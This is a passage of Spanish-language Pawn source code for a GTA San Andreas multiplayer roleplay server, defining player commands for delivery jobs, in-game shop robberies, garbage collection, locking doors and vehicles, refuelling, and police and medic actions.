			    SetPlayerCP(playerid,CP_REPARTIDORB,PosRepartidorBici[0][Posx],PosRepartidorBici[0][Posy],PosRepartidorBici[0][Posz],4);
			    Mensaje(playerid,C_INFO,"> "#CBLANCO"¡Comienza a repartir! Sigue los puntos "#CROJO"rojos "#CBLANCO"en el mapa");
				SetPVarInt(playerid,PVarRepartidorB,1);
				SetProgressBarValue(BCosecha[playerid],0);
				SetProgressBarMaxValue(BCosecha[playerid],sizeof PosRepartidorBici-1);
				ShowProgressBarForPlayer(playerid,BCosecha[playerid]);
				return 1;
			}
			return Error(playerid,"¡Debes estar en un bicicleta!");
		}
	    if(!strcmp(params, "pizza", true))
	    {
		    if(InfoJugador[playerid][jTrabajo] != ID_RepartidorP) return Error(playerid,"¡Debes ser repartidor de pizza!");
			if(!IsPlayerInRangeOfPoint(playerid, 50.0, 2094.7319,-1830.0093,13.5737)) return Error(playerid, "Debes estar cerca de la pizzería para comenzar a repartir pizza");
			if(GetPVarInt(playerid, "Parte_RepartirP")) return Error(playerid, "¡Ya estás repartiendo pizza!");

			SetPlayerCP(playerid, CP_REPARTIDORP, 2121.56, -1823.43, 13.56, 2.0);
			Error(playerid, "Dirigete al ~r~checkpoint ~w~para tomar la pizza.");
			return 1;
		}
		return ParamsINC(playerid, "/repartir [pizza/diarios]");
	}

// --=======================-- //
Float: Resto(num1, num2)// Esto lo deberia traer samp por defecto..
{
	return float(floatround(num1 % num2));
}
// --=======================-- //

	CMD:robar(playerid, params[])
	{
	    static
			ultimo_robo;

	    if(InfoJugador[playerid][jTrabajo] != ID_Ladron) return Error(playerid,"¡Necesitas ser un ladron para robar!");
	    if(!strcmp(params, "negocio", true))
	    {
	        new
	            i = ID_Negocio(playerid);

	        if(i == INVALID_BUSINESS_ID) return Error(playerid,"¡Debes estar en un negocio!");
	        if(InfoNegocio[i][nTipo] == N_ARMAS) return Error(playerid, "No podes robar el AmmuNation.");
			#if defined USE_FCNPC
	        if(!NPC_NEGOCIO[i]) return Error(playerid, "¡Aquí no hay un vendedor a quien robarle!");
			#endif
	        if(GetPVarInt(playerid,"ROBANDO")) return Error(playerid,"¡Ya estás robando!");
			if( (GetTickCount() - ultimo_robo) < 60000*MIN_ENTRE_ROBOS)
			{
			    new
			        MS_LEFT = (GetTickCount() - ultimo_robo),
					Float: Time = (MIN_ENTRE_ROBOS * 60) - (MS_LEFT / 1000),
					Float: Min = (Time / 60),
					Float: Segs = Resto(floatround(Time), 60);

				return MensajeF(playerid, -1, "Los negocios pueden ser robados cada "#CROJO""#MIN_ENTRE_ROBOS" "#CBLANCO"minutos. Falta: "#CVERDE"%02.0f:%02.0f Min.", Min, Segs);
			}

			switch(GetPlayerWeapon(playerid))
			{
			    case 4,5,8,18, 22..34: {}
			    default: return Error(playerid, "¡Debes temer un arma válida para robo, en la mano!");
			}

			new
				Float: NPC_P[3],
				Float: P[3],
				Weap[20],
				Rol[50];

			#if defined USE_FCNPC
			FCNPC_GetPosition(NPC_NEGOCIO[i], NPC_P[0], NPC_P[1], NPC_P[2]);

			if(GetPlayerDistanceFromPoint(playerid,  NPC_P[0], NPC_P[1], NPC_P[2]) > 3.0) return Error(playerid, "¡Acercate más al vendedor/a para robar!");

			#endif

			ultimo_robo = GetTickCount();

			GetWeaponName(GetPlayerWeapon(playerid), Weap, 20);
			A_Format(Rol, "apunta con su %s al vendedor/a", Weap);
			AutoRol(playerid, Rol);
			GetPlayerPos(playerid, P[0], P[1], P[2]);
			SetPlayerFacingAngle(playerid, floatabs( 360.0 - atan2(NPC_P[0]-P[0], NPC_P[1]-P[1])) );
			CongelarEx(playerid, 2);
			cmd_amenazar(playerid, "");
			SetTimerEx("Robar", 1000, false, "ii", playerid, 0);
			SetPVarInt(playerid,"ROBANDO", 1);
			#if defined USE_FCNPC
			FCNPC_SetSpecialAction(NPC_NEGOCIO[i], SPECIAL_ACTION_HANDSUP);
			#endif
			return 1;
		}
		if(!strcmp(params,"banco",true)) return Mensaje(playerid,-1,"El sistema de robo al banco aun está en desarrollo.");
		return ParamsINC(playerid,"/robar <banco/negocio>");
	}


	CMD:limpiar(playerid,params[])
	{
	    if(!EsBasurero(playerid)) return Error(playerid,"¡No eres basurero!");
	    new Parte = GetPVarInt(playerid,"B_ParteLimpieza");
	    if(IsPlayerInRangeOfPoint(playerid,3,PosBasura[Parte][0],PosBasura[Parte][1],PosBasura[Parte][2]))
	    {
	        if(!CheckDistanciaConVehiculo(playerid,20,GetPVarInt(playerid,"CAMION_BASURA"))) return Error(playerid,"¡Debes acercar más el camión a ti!");
			if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar a pie para recojer basúra!");
			if(Parte >= sizeof(PosBasura)-1) return Error(playerid,"¡Debes ir a descargar la basúra!");
			AutoRol(playerid,"recoje una bolsa y la tira al camión de basúra");
			Parte++;
			SetPVarInt(playerid,"B_ParteLimpieza",Parte);
	        SetPlayerCP(playerid,CP_BASURERO,PosBasura[Parte][0],PosBasura[Parte][1],PosBasura[Parte][2],3);
			DestroyDynamicObject(OBJ_Basura[Parte-1]);
			OBJ_Basura[Parte-1] = INVALID_OBJECT_ID;
			if(Parte >= sizeof(PosBasura)-1)
			{
			    Mensaje(playerid,-1,"Terminaste de juntar la basúra, ahora debes ir al basurero a descargarla "#CINFO"(/descargar basura)");
				SetProgressBarColor(BCosecha[playerid],C_AZUL2);
			}
			SetProgressBarValue(BCosecha[playerid],Parte);
			UpdateProgressBar(BCosecha[playerid],playerid);
			return 1;
		}
		return Error(playerid,"No estás en el lugar donde 'deberias' estar. ¡Debes seguir el punto rojo!");
	}

	CMD:descargar(playerid,params[])
	{
		if(!strcmp(params,"basura",true))
		{
		    if(GetPVarInt(playerid,"B_ParteLimpieza") != sizeof(PosBasura)-1) return Error(playerid,"¡Aún no puedes descargar la basúra!");
			if(!EsVehBasurero(GetPlayerVehicleID(playerid))) return Error(playerid,"¡No estás en un camión basurero!");
			if(GetPVarInt(playerid,"CAMION_BASURA") != GetPlayerVehicleID(playerid)) return Error(playerid,"Debes estar en 'tu' camión de basúra, para descargar. (El camión con el que empezaste)");
			CongelarEx(playerid,8);
			TextoJugador(playerid,"~w~descargando ~g~basura...",8000,3);
			SetTimerEx("DescagarCamionB",8000,false,"i",playerid);
			return 1;
		}
		return ParamsINC(playerid,"/descargar <ITEM>");
	}

	// -------=====[ Comandos negocios [=======------ //

	CMD:negocio(playerid,params[])
	{
		if(EstaEnSuNegocio(playerid) && ( ID_Negocio(playerid) != INVALID_BUSINESS_ID ))
		{
		    new n = ID_Negocio(playerid);
			new str[160];
   			format(str,sizeof(str),"- Caja fuerte "#CPOSITIVO"($%d)\n- Cambiar nombre "#CPOSITIVO"(%s)\n- Precio de entrada "#CPOSITIVO"($%d)",InfoNegocio[n][nDinero],InfoNegocio[n][nNombre],InfoNegocio[n][nPrecioEntrada]);
			Dialog(playerid,dMenuNegocio,DIALOG_STYLE_LIST,""#CINFO"Negocio",str,"Aceptar","Cancelar");
			SetPVarInt(playerid,"CajaFuerte",CF_NEGOCIO);
			return 1;
		}
		return Error(playerid,"¡No estás en tu negocio!");
	}

	CMD:casa(playerid,params[])
	{
		if( ( ID_Casa(playerid) != INVALID_HOUSE_ID ) && TieneLlaveCasa(playerid,ID_Casa(playerid)))
		{
		    new n = ID_Casa(playerid);
			new str[160];
			format(str,sizeof(str),"- Caja fuerte "#CPOSITIVO"($%d)\n- Cambiar nombre "#CPOSITIVO"(%s)\n- Armas\n- Muebles\n- Contraseña de la puerta",InfoCasa[n][cDinero],InfoCasa[n][cNombre]);
			Dialog(playerid,dMenuCasa,DIALOG_STYLE_LIST,""#CINFO"Casa",str,"Aceptar","Cancelar");
			SetPVarInt(playerid,"CajaFuerte",CF_CASA);
			return 1;
		}
		return Error(playerid,"¡No estás en tu casa!");
	}

	// -------=====[ Comandos vehículos [=======------ //

	CMD:estacionar(playerid, params[])
	{
		Comando_En_Auto
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID))
		{
  			if(EsDuenoVeh(playerid,VehVenta_ID(VehID)) || (InfoVeh[VehVenta_ID(VehID)][vFamilia] && InfoJugador[playerid][jLiderFam] == InfoVeh[VehVenta_ID(VehID)][vFamilia]))
	    	{
		        GetVehiclePos(VehID, InfoVeh[VehVenta_ID(VehID)][vPosX],InfoVeh[VehVenta_ID(VehID)][vPosY], InfoVeh[VehVenta_ID(VehID)][vPosZ]);
		        GetVehicleZAngle(VehID, InfoVeh[VehVenta_ID(VehID)][vPosA]);
		        InfoVeh[VehVenta_ID(VehID)][vInt]  = GetPlayerInterior(playerid);
				InfoVeh[VehVenta_ID(VehID)][vVW]   = GetPlayerVirtualWorld(playerid);
				TextoJugador(playerid,"~w~el vehiculo fue estacionado ~g~correctamente",4000,3);
				ActualizarVehiculo(VehVenta_ID(VehID));
				AutoRol(playerid,"estaciona su vehículo");
				return 1;
			}
			else return Error(playerid, "¡Este no es tu vehículo!"),1;
		}
		else return Error(playerid, "¡Este vehículo no es apropiable!"),1;
	}

	CMD:quitarmodificaciones(playerid, params[])
	{
		Comando_En_Auto
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID) != 0)
		{
		    if(strmatch(InfoVeh[VehVenta_ID(VehID)][vComprador], pName(playerid)))
		    {
		        Loop(i, MAX_VEH_MODS, 0)
				{
				    if(vMods[VehVenta_ID(VehID)][i])
				    {
						vMods[VehVenta_ID(VehID)][i] = 0;
						RemoveVehicleComponent(VehID,vMods[VehVenta_ID(VehID)][i]);
					}
				}
				TextoJugador(playerid, "~w~El tunning fue quitado de este vehiculo",4000,3);
				ActualizarVehiculo(VehVenta_ID(VehID));
				return 1;
			}
			else return Error(playerid, "¡Este no es tu vehiculo!"),1;
		}
		else return Error(playerid, "¡No puedes quitarle los componentes a este vehículo!"),1;
	}

	CMD:cargar(playerid, params[])
	{
		new
		    Item_0[20],
		    Litros = -1,
		    VehID = GetPlayerVehicleID(playerid),
			VehType = GetVehType(VehID);

		if(sscanf(params, "p< >s[20]D(-1)", Item_0, Litros)) return ParamsINC(playerid, "/cargar combustible [opcional: litros]");

		if(!strcmp(Item_0, "combustible", true))
		{
		    if(!EstaEnEstacionServicio(playerid)) return Error(playerid, "¡No estas en una estación de servicio!");
	        if(GetPVarInt(playerid,"CargandoComb")) return Error(playerid,"¡Ya estas cargando combustible!");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Error(playerid,"¡Debes ser el conductor de un vehículo!");
			if(VehType != VEHICLE_TYPE_CAR && VehType != VEHICLE_TYPE_BIKE) return Error(playerid, "¡Debe ser una moto, o un coche!");
		    if(Litros > (100-VGas[VehID])) return Error(playerid, "No le entran tantos litros al vehículo!");
		    if(!Litros) return Error(playerid, "Los litros deben ser un número positivo.");
		    if(VGas[VehID] == 100) return Error(playerid, "El tanque ya está lleno.");

	     	CargarGasolina_P(playerid, Litros);
	      	CongelarEx(playerid);
			return 1;
		}
		return ParamsINC(playerid, "/cargar combustible [opcional: litros]");
	}

	CMD:veh(playerid,params[])
	{
		Comando_En_Auto
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID) == 0) return Error(playerid,"¡Debe ser tu vehículo para agregarlo o quitarlo de la familia");
		if(!EsDuenoVeh(playerid,VehVenta_ID(VehID))) return Error(playerid,"¡Debes ser el dueño del vehículo!");
		if(sscanf(params,"s[14]",params[0])) return ParamsINC(playerid,"/veh [a familia/sacar familia]");
		if(!strcmp(params[0],"a familia",true))
		{
			if(!InfoJugador[playerid][jLiderFam] && !InfoJugador[playerid][jMiembroFam]) return Error(playerid,"¡No tienes ninguna familia!");
			new str[135];
		    if(InfoJugador[playerid][jLiderFam])
			{
				InfoVeh[VehVenta_ID(VehID)][vFamilia] = InfoJugador[playerid][jLiderFam];
				format(str,sizeof(str),"¡%s agregó su vehículo "#CADMINISTRADOR"( %s )"#CBLANCO" a nuestra familia! "#CPOSITIVO"( %s )",NombreJugador_(playerid),NombreVehiculo(VehID),InfoFamilia[InfoJugador[playerid][jLiderFam]][fNombre]);
				MensajeFamilia(InfoJugador[playerid][jLiderFam],str);
				ActualizarVehiculo(VehVenta_ID(VehID));
			}
		    else if(InfoJugador[playerid][jMiembroFam])
			{
				InfoVeh[VehVenta_ID(VehID)][vFamilia] = InfoJugador[playerid][jMiembroFam];
				format(str,sizeof(str),"¡%s agregó su vehículo "#CADMINISTRADOR"( %s )"#CBLANCO" a nuestra familia! "#CPOSITIVO"( %s )",NombreJugador_(playerid),NombreVehiculo(VehID),InfoFamilia[InfoJugador[playerid][jMiembroFam]][fNombre]);
				MensajeFamilia(InfoJugador[playerid][jMiembroFam],str);
				ActualizarVehiculo(VehVenta_ID(VehID));
			}
		}
		else if(!strcmp(params[0],"sacar familia",true))
		{
		    if(InfoVeh[VehVenta_ID(VehID)][vFamilia] == 0) return Error(playerid,"¡Tu vehículo no pertenece a ninguna familia!");
		    InfoVeh[VehVenta_ID(VehID)][vFamilia] = 0;
			new str[100];
			if(InfoJugador[playerid][jLiderFam])
			{
				format(str,sizeof(str),"%s quitó su vehículo "#CADMINISTRADOR"( %s )"#CBLANCO" de la familia "#CPOSITIVO"( %s )",NombreJugador_(playerid),NombreVehiculo(VehID),InfoFamilia[InfoJugador[playerid][jLiderFam]][fNombre]);
				MensajeFamilia(InfoJugador[playerid][jLiderFam],str);
				ActualizarVehiculo(VehVenta_ID(VehID));
			}
  			else if(InfoJugador[playerid][jMiembroFam])
			{
				format(str,sizeof(str),"%s quitó su vehículo "#CADMINISTRADOR"( %s )"#CBLANCO" de la familia "#CPOSITIVO"( %s )",NombreJugador_(playerid),NombreVehiculo(VehID),InfoFamilia[InfoJugador[playerid][jMiembroFam]][fNombre]);
				MensajeFamilia(InfoJugador[playerid][jLiderFam],str);
				ActualizarVehiculo(VehVenta_ID(VehID));
			}
		}
		else return ParamsINC(playerid,"/veh [a familia/sacar familia]");
		return 1;
	}


	CMD:cerrar(playerid,params[])
	{
        new
            VehID;

	    if(!strcmp(params,"vehiculo",true))
	    {
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");
			if(Veh[VehID][vTrabajo]) return Error(playerid,"¡No puedes cerrar un vehículo de trabajo con este comando!");

			new
			    Str_rol[70];

			if(Veh[VehID][vCerrado]) return Error(playerid,"¡Ese vehículo ya está cerrado!");

			A_Format(Str_rol, "cierra las puertas del %s con su llave", NombreVehiculo(VehID));
			AutoRol(playerid, Str_rol);

			CerrarPuertas(VehID);

			if(VehVenta_ID(VehID))
			{
			    InfoVeh[VehVenta_ID(VehID)][vCerrado] = true;
			    ActualizarVehiculo(VehVenta_ID(VehID));
			}
			return 1;
		}
	    else if(!strcmp(params,"capo",true))
	    {
	        if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar afuera para cerrar el capo!");
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");

			CerrarCapo(VehID);
			AutoRol(playerid,"cierra el capó de su vehículo");
			return 1;
		}
	    else if(!strcmp(params,"maletero",true))
		{
	        if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar afuera para abrir el maletero!");
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");

			CerrarBaul(VehID);
			AutoRol(playerid,"cierra el maletero de su vehículo");
			return 1;
		}
	    else if(!strcmp(params,"casa",true))
	    {
			foreach(Casas,n)
			{
				if(TieneLlaveCasa(playerid,n))
				{
					if(IsPlayerInRangeOfPoint(playerid,1,InfoCasa[n][cEntrada_x],InfoCasa[n][cEntrada_y],InfoCasa[n][cEntrada_z]) || (IsPlayerInRangeOfPoint(playerid,1,InfoCasa[n][cSalida_x],InfoCasa[n][cSalida_y],InfoCasa[n][cSalida_z]) && GetPlayerVirtualWorld(playerid) == InfoCasa[n][cVW]))
					{
						TextoJugador(playerid,"~w~puerta ~r~cerrada",3000,3);
						AutoRol(playerid,"cierra la puerta de su casa con llave");
						InfoCasa[n][cCerrada] = true;
						ActualizarCasaLabel(n);
						ActualizarCasa(n);
						return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu casa, o no tienes una.");
		}
		//Negocio
	    else if(!strcmp(params,"negocio",true))
	    {
			foreach(Negocios,n)
			{
				if(strmatch(InfoNegocio[n][nComprador], pName(playerid)))
				{
					if(IsPlayerInRangeOfPoint(playerid,1,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]))
					{
						TextoJugador(playerid,"~w~puerta ~r~cerrada",3000,3);
						AutoRol(playerid,"cierra la puerta de su negocio con llave");
						InfoNegocio[n][nCerrado] = true;
						ActualizarNegLabel(n);
						ActualizarNegocio(n);
						return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu negocio, o no tienes uno.");
		}
		//Garage
	    else if(!strcmp(params,"garage",true))
	    {
	   		foreach(Garages,i)
			{
				if(IsPlayerInRangeOfPoint(playerid,3,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]))
				{
					if(strmatch(InfoCasa[InfoGarage[i][gIDCasa]][cComprador],pName(playerid)))
					{
					    InfoGarage[i][gCerrado] = true;
					    TextoJugador(playerid,"~w~garage ~r~cerrado",3000,3);
						ActualizarGarage(i);
					    return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu garage, o no tienes uno.");
		}
		return ParamsINC(playerid,"/cerrar <(vehiculo - capo - maletero - casa - negocio)>");
	}

	CMD:abrir(playerid,params[])
	{
        new
            VehID;

	    if(!strcmp(params,"vehiculo",true))
	    {
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");
			if(Veh[VehID][vTrabajo]) return Error(playerid,"¡No puedes abrir un vehículo de trabajo con este comando!");

			new
			    Str_rol[70];

			if(!Veh[VehID][vCerrado]) return Error(playerid,"¡Ese vehículo ya está abierto!");

			A_Format(Str_rol, "abre las puertas del %s con su llave", NombreVehiculo(VehID));
			AutoRol(playerid, Str_rol);

			AbrirPuertas(VehID);

			if(VehVenta_ID(VehID))
			{
			    InfoVeh[VehVenta_ID(VehID)][vCerrado] = false;
			    ActualizarVehiculo(VehVenta_ID(VehID));
			}
			return 1;
		}
	    else if(!strcmp(params,"capo",true))
	    {
	        if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar afuera para abrir el capo!");
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");

	        if(Veh[VehID][vCapo] == true)
	        {
       			AbrirCapo(VehID);
				AutoRol(playerid,"abre el capó de su vehículo");
			}
			else
			{
				Error(playerid,"¡Debes destrabar el capó desde adentro para poder abrirlo!");
			}
			return 1;
		}
	    else if(!strcmp(params,"maletero",true))
		{
	        if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar afuera para abrir el maletero!");
			VehID = VehMasCercano(playerid, true);
			if(VehID == INVALID_VEHICLE_ID) return Error(playerid,"No se encontro ningún vehículo cerca tuyo.");

	        if(Veh[VehID][vBaul] == true)
	        {
       			AbrirBaul(VehID);
				AutoRol(playerid,"abre el maletero de su vehículo");
			}
			else
			{
				Error(playerid,"¡Debes destrabar el maletero desde adentro para poder abrirlo!");
			}
		}
	    else if(!strcmp(params,"casa",true))
	    {
			foreach(Casas,n)
			{
				if(TieneLlaveCasa(playerid,n))
				{
					if(IsPlayerInRangeOfPoint(playerid,1,InfoCasa[n][cEntrada_x],InfoCasa[n][cEntrada_y],InfoCasa[n][cEntrada_z]) || (IsPlayerInRangeOfPoint(playerid,1,InfoCasa[n][cSalida_x],InfoCasa[n][cSalida_y],InfoCasa[n][cSalida_z]) && GetPlayerVirtualWorld(playerid) == InfoCasa[n][cVW]))
					{
						TextoJugador(playerid,"~w~puerta ~g~abierta",3000,3);
						AutoRol(playerid,"abre la puerta de su casa con su llave");
						InfoCasa[n][cCerrada] = false;
						ActualizarCasaLabel(n);
						ActualizarCasa(n);
						return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu casa, o no tienes una.");
		}
	    else if(!strcmp(params,"negocio",true))
	    {
			foreach(Negocios,n)
			{
				if(strmatch(InfoNegocio[n][nComprador], pName(playerid)))
				{
					if(IsPlayerInRangeOfPoint(playerid,1,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]) || (IsPlayerInRangeOfPoint(playerid,1,InfoNegocio[n][nSalida_x],InfoNegocio[n][nSalida_y],InfoNegocio[n][nSalida_z]) && GetPlayerVirtualWorld(playerid) == InfoNegocio[n][nVW]))
					{
						TextoJugador(playerid,"~w~puerta ~g~abierta",3000,3);
						AutoRol(playerid,"abre la puerta de su negocio con su llave");
						InfoNegocio[n][nCerrado] = false;
						ActualizarNegLabel(n);
						ActualizarNegocio(n);
						return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu negocio, o no tienes uno.");
		}
		//Garage
	    else if(!strcmp(params,"garage",true))
	    {
	   		foreach(Garages,i)
			{
				if(IsPlayerInRangeOfPoint(playerid,3,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]))
				{
					if(strmatch(InfoCasa[InfoGarage[i][gIDCasa]][cComprador],pName(playerid)))
					{
					    InfoGarage[i][gCerrado] = false;
					    TextoJugador(playerid,"~w~garage ~g~abierto",3000,3);
						ActualizarGarage(i);
					    return 1;
					}
				}
			}
			return Error(playerid,"No estás en la puerta de tu garage, o no tienes uno.");
		}
		return ParamsINC(playerid,"/abrir <(vehiculo - capo - maletero - casa - negocio - garage)>");
	}


	// --=======[ COMANDOS LSPD / LSEM ]========-- //

	CMD:autorizararmas(playerid,params[])
	{
	    if(InfoJugador[playerid][jLider] != IDLSPD && InfoJugador[playerid][jLider] != IDLSEM ) return Error(playerid,"¡Solo el lider policia/militar puede hacer esto!");
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/autorizararmas [ID]");
	 	if(!ProxDetectorS(8.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		new Str[60];
		A_Format(Str,"le da una licencia de armas a %s",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		InfoJugador[params[0]][jLicenciaArmas] = true;
		return 1;
	}

	CMD:desautorizararmas(playerid,params[])
	{
	    if(InfoJugador[playerid][jLider] != IDLSPD && InfoJugador[playerid][jLider] != IDLSEM ) return Error(playerid,"¡Solo el lider policia/militar puede hacer esto!");
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/desautorizararmas [ID]");
	 	if(!ProxDetectorS(8.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		new Str[60];
		A_Format(Str,"le quita la licencia de armas a %s",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		InfoJugador[params[0]][jLicenciaArmas] = false;
		return 1;
	}


	CMD:irpos(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio

	    new
			Float:Pos[3];

	    if(sscanf(params, "p<,>fff", Pos[0], Pos[1], Pos[2])) return ParamsINC(playerid,"/irpos [CORDENADA, CORDENADA, CORDENADA]");

	    Loop(i, 3, 0)
		{
			if(Pos[i] > 9999.9)
			{
				return Error(playerid,"Coordenada demasiado grande.");
			}
		}

	    return SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	}


	CMD:refuerzos(playerid,params[])
	{
	    if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres militar, ni policia!");
		foreach(Player,i) if(EsLSPD(i))
		{
			MensajeF(i, -1,"¡El oficial "#CLSPD"%s "#CBLANCO"necesita refuerzos! "#CLSPD"(Punto celeste)", NombreJugador(playerid) );
			SetPlayerMarkerForPlayer(i, playerid, C_LSPD);
		}
		Mensaje(playerid, -1, "Utiliza "#CINFO"/noref "#CBLANCO"para desactivar los refuerzos.");
	    return 1;
	}

	CMD:noref(playerid, params[])
	{
	    if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres militar, ni policia!");

		new
		    col = GetPlayerColor(playerid);
		    
		foreach(Player,i) if(EsLSPD(i))
			SetPlayerMarkerForPlayer(i, playerid, col);

		Mensaje(playerid, -1, "Los refuerzos fueron desactivados.");
	    return 1;
	}

	CMD:activartazer(playerid,params[])
	{
	    if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!");
	    if(GetPVarInt(playerid,"TAZER_DK")) return Error(playerid,"¡Ya tienes el tazer activado!");
	    new Arma,Balas;
	    GetPlayerWeaponData(playerid,2,Arma,Balas);
	    if(Arma != WEAP_TAZER || !Balas) return Error(playerid,"¡No tienes una 9mm!");
	    AutoRol(playerid,"carga su 9mm tazer");
	    SetPVarInt(playerid,"TAZER_DK",1);
	    return 1;
	}

	CMD:desactivartazer(playerid,params[])
	{
	    if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!");
	    if(!GetPVarInt(playerid,"TAZER_DK")) return Error(playerid,"¡No tienes el tazer activado!");
	    new Arma,Balas;
	    GetPlayerWeaponData(playerid,2,Arma,Balas);
	    if(Arma != WEAP_TAZER || !Balas) return Error(playerid,"¡No tienes una 9mm!");
	    AutoRol(playerid,"descarga su 9mm tazer");
	    DeletePVar(playerid,"TAZER_DK");
	    return 1;
	}

	CMD:sacarcables(playerid,params[])
	{
	    if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!");
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/sacarcables [ID/NOMBRE]");
	 	if(!ProxDetectorS(2.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		if(!GetPVarInt(params[0],"TAZEADO")) return Error(playerid,"¡Ese jugador no está tazeado!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		new Str[75];
		A_Format(Str,"le quita los cables de su cuerpo a %s con una pinza",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		DeletePVar(params[0],"TAZEADO");
		Bit_Set(AnimsLocked, params[0], false);
		cmd_detener(params[0],"");
		TextoJugador(params[0],"~w~te quitaron los cables",3000,3);
		return 1;
	}

	CMD:revisarcinturon(playerid,params [])
	{
	    if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"No eres militar, ni policia!");
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/revisarcinturon [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	 	if(!ProxDetectorS(6.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		if(!IsPlayerInAnyVehicle(params[0])) return Error(playerid,"¡Ese jugador no está en un vehículo!");
		new Str[60];
		if(GetPVarInt(params[0],"TIENE_CINTURON"))
		{
		    A_Format(Str,"%s tiene el cinturón puesto.",NombreJugador(params[0]));
		    Mensaje(playerid,-1,Str);
		}
		else
		{
		    A_Format(Str,"%s no tiene el cinturón puesto.",NombreJugador(params[0]));
		    Mensaje(playerid,-1,Str);
		}
		A_Format(Str,"se fija si %s tiene el cinturón puesto",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		return 1;
	}

	CMD:usar(playerid,params[])
	{
	    if(!strcmp(params,"camaras",true))
	    {
	        if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!");
	        if(!IsPlayerInRangeOfPoint(playerid,2,233.4676,123.4960,1003.21)) return Error(playerid,"¡Aquí no hay cámaras de seguridad!");
		    new Str[100];
		    Loop(i,MAX_CAMARAS,0) strcat(Str,InfoCamara[i][CamNombre]);
		    Dialog(playerid,dCamarasLSPD,DIALOG_STYLE_LIST,""#CAZUL2"Cámaras de seguridad - LSPD",Str,"Aceptar","Cancelar");
		    return 1;
		}
		else if(!strcmp(params,"camilla", true))
		{
			if(!EsMedico(playerid)) return Error(playerid,"¡No eres médico!");
			Loop(i, sizeof(Camillas), 0)
			{
				if(InfoCamilla[i][camiUsadaPor] == playerid) return Error(playerid,"¡Ya estás usando una camilla!");
			}
			Loop(i, sizeof(Camillas), 0)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 2.0, Camillas[i][0], Camillas[i][1], Camillas[i][2]))
			    {
			        if(InfoCamilla[i][camiUsadaPor] != INVALID_PLAYER_ID) continue;
			        InfoCamilla[i][camiUsadaPor] = playerid;
			        KillTimer2(playerid, TIMER_CAMILLA);

			        new
			            Float:Pos[4];

					GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
					GetPlayerFacingAngle(playerid, Pos[3]);
					GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], 1.7);

					SetObjectPos(InfoCamilla[i][camiObjID], Pos[0], Pos[1], Pos[2]);
					SetObjectRot(InfoCamilla[i][camiObjID], 0.0, 0.0, Pos[3]);

			        Timer_Jugador[playerid][TIMER_CAMILLA] = SetTimerEx("ActualizarCamilla", 80, true, "ii", playerid, InfoCamilla[i][camiObjID]);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
			        AutoRol(playerid,"toma una camilla");
			        return 1;
				}
			}
			return Error(playerid,"¡No hay una camilla para usar!");
		}
	    else if(!strcmp(params,"medicamentos",true))
	    {
	        new Str[100];
